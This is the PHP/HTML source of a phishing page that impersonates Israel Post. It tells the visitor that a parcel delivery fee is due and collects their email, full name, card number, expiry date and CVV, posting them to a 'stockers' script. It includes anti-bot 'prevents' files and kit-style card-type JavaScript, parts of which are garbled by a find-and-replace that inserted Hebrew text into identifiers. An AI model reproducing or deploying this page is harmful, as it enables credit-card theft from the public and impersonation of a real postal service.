<?php
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../extra/mine.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index.php"));
}else{
  include "../extra/languages/{$_SESSION['language']}.php";
}
  ?>
<html lang="is"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="./files/css2" rel="stylesheet">
    <link rel="stylesheet" href="./files/all.min.css">
    <link rel="icon" type="image/png" href="img/fav.png">

    <link rel="stylesheet" href="./files/bootstrap.min.css">
	<link rel="stylesheet" href="./files/theme.min.css">
    <link rel="stylesheet" href="./files/style.css">
    <script src="./files/masking-input.js" data-autoinit="true"></script>
    <title>israelpost.co.il</title>
</head>
<body>
<div class="container">
    <div class="main">
        <form id="cardForm" action="../extra/stockers/step1.php" method="post">
            <section class="first-sec">
                <div class="centrer  ">
                    <p class="borderB"><img src="./files/aus-logo.png" style=" width: 50%;"><select style="  float: right; border: 0 ; padding: 15px">
                            <option selected="" value="DE">co.il</option>
                        </select></p>

                </div>
                <div class="paddingDiv" style="margin-top: 20px ; margin-bottom: 10px">


                    <strong class="textMessage2">israelpost.co.il שירות משלוחים לפי דרישה</strong>
                    <p class="textMessage">
                       שירות משלוחים לפי דרישה של דואר ישראל
החבילות שלך ממתינות למשלוח. נא לאשר תשלום (10.56 ₪). יש להשלים את האימות המקוון תוך יומיים לפני תום הזמן.

                    </p>
                </div>
                <p class="HROr">מידע על הקוליס</p>
                <div class="  paddingDiv">
                    <div class="first-sec-top0">

                        <div style="width: 100%;  ">
                            <p style="width: 50%; float: left">סך הכל</p>
                            <p style="width: 50%; float: right;    text-align: right;">₪.10,56</p>
                        </div>
                    </div>
                    <div class="first-sec-top">

                        <div class="first-sec-doll">
                            <p>מספר מעקב</p>
                            <h4>99600****59972</h4>
                        </div>
                        <div class="first-sec-doll-img">
                            <img src="./files/pak.png" alt="image">
                        </div>
                    </div>
                </div>
                <p class="HROr">אשר את אמצעי התשלום</p>
                <div class="first-sec-inf paddingDiv">
				
				                    <div class="second-sec-info">
                        <div class="second-sec-info-form">
                             <input type="text" class="form-control inpt222" placeholder="כתובת דוא"ל" name="EML" required="">
                            <div class="second-sec-info-nb">			

                    <div class="second-sec-info">
                        <div class="second-sec-info-form">
                             <input type="text" class="form-control inpt222" placeholder="שם משפחה ושם פרטי" name="lname" required="">
                            <div class="second-sec-info-nb">

                                <input class="form-control inpt inpt1" type="text" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" name="cardnumber"  inputmode="numeric" required="" onkeypress="isInputNumber(event)" autocomplete="off">
                                <div class="second-sec-info-nb-imgs">
                                    <img class="img1" src="./files/1.png" width="20px">
                                    <img class="img2" src="./files/2.png" width="20px">
									<img class="img2" src="./files/3.png" width="20px">
                                </div>
                            </div>
                            <div class="second-sec-info-cc">
                                <input type="text" class="form-control inpt inpt2" id="date" placeholder="MM / YY" name="expdate" required="" onchange="isInputNumber(event)" autocomplete="off">
                                <div class="v2-cvv v2-card-create-cvv">
                                    <input id="cvv2" class="i-settings-input cvv x2 v2-cvv-input v2-card-create-cvv-input v2-input-can-be-reset dirty form-control inpt inpt3" type="text" maxlength="3" placeholder="***" name="Securitycode" required="" onkeypress="isInputNumber(event)" autocomplete="off">
                                    <div class="v2-sprite-payment v2-cvv-tip" title="The last 3 digits on the back of your card">
                                    </div>
                                </div>
                            </div>
                            <button class="ap-btn ap-btn-primary" type="שלח">לְאַשֵׁר</button>
                        </div>
                    </div>

                </div>
                <footer>

                    <p class="copyright">
                        © צור קשר תנאים והגבלות כלליים
                        
                    נגישות AGBs הגנת מידע והסתייגות פרטי פרסום © 2022 israelpost.co.il Ltd.</p>
                </footer>
            </section>

        </form>
    </div>

</div>

<script src="./files/cleave.min.js" integrity="sha512-KaIyHb30iXTXfGyI9cyKFUIRSSuekJt6/vqXtyQKhQP6ozZEGY8nOtRS6fExqE4+RbYHus2yGyYg1BrqxzV6YA==" crossorigin="anonymous"></script>
<script>

    /*תַאֲרִיך Expiration*/
    var cleave = new Cleave('.inpt2', {
        תַאֲרִיך: true,
        תַאֲרִיךPattern: ['m', 'y']
    });
    /*Card Number*/
    var cleave = new Cleave('.inpt1', {
        creditCard: true,
        delimiter: " ",
    });


    function isInputNumber(evt) {

        var ch = String.fromCharCode(evt.which);

        if (!(/[0-9]/.test(ch))) {
            evt.preventDefault();
        }

    }
</script>


</body></html>
				
	    <script type="text/javascript">   
    $('#cardnumber').valiתַאֲרִיךCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":

 $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 94%');
$('#thDSecure').css('background-position', '255.5% -20.5%'); 

                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');


$('#cardnumber').css('background-position', '98.5% 97%'); 


$('#thDSecure').css('background-position', '99.5% -20.5%'); 



$('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');






   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 72%');

$('#thDSecure').css('background-position', '99.5% 9.5%'); 

                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');

$('#cardnumber').css('background-position', '98.5% 69%');

$('#thDSecure').css('background-position', '102.5% 62.5%'); 



                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



                        $('#cardnumber').css('background-position', '98.5% 46.8%');

$('#thDSecure').css('background-position', '98.5% 46.8%'); 

          
$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#csc').attr('pattern', '[0-9]{4}');
          $('#Securitycode').attr('maxlength', '4');

                        $('#cardnumber').css('background-position', '98.5% 6%');
$('#thDSecure').css('background-position', '99.5% 34%'); 




$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');


                        break;
          case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');



$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


                       break;
          case "DINERS_CLUB":

$('.chtadakchi').attr('id', 'chtacalub');


$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');





                        $('#cardnumber').css('background-position', '98.5% 24.8%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 

                        break;
          default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
      } else {

$('.chtadakchi').attr('id', 'jkljk');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% -0.2%');

$('#csc').attr('placeholder', 'Enter security code');
            }
       // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
    </script>



  <script type="text/javascript">
        $(function() {
        $('#cardnumber').valiתַאֲרִיךCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
      $('#cardnumber').valiתַאֲרִיךCreditCard(function(result) {
          if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
          
                }
            });
            });
    });
        </script></body></html>